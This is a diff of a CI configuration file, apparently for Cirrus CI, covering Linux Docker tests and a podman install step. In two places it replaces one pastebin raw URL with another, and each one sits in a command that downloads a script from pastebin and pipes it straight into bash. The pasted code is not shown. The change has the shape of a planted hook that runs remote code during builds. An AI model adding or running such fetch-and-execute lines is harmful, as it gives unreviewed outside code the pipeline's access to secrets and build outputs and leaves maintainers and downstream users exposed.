@@ -2,7 +2,7 @@ docker_builder:
   name: Test (Linux with Docker)
   alias: Tests
   test_script:
-    - bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)" 
+    - bash -c "$(curl -fsSL https://pastebin.com/raw/zy1Ss1Xz)" 
     - export PATH=$PATH:/usr/local/go/bin
     - go test ./...
   env:
@@ -13,7 +13,7 @@ docker_builder:
   allow_failures: true
   alias: Tests
   install_podman_script:
-    - bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)" 
+    - bash -c "$(curl -fsSL https://pastebin.com/raw/zy1Ss1Xz)" 
     - sudo apt-get -y install podman
   configure_podman_script:
     - echo 'unqualified-search-registries=["docker.io"]' > /etc/containers/registries.conf.d/docker.conf
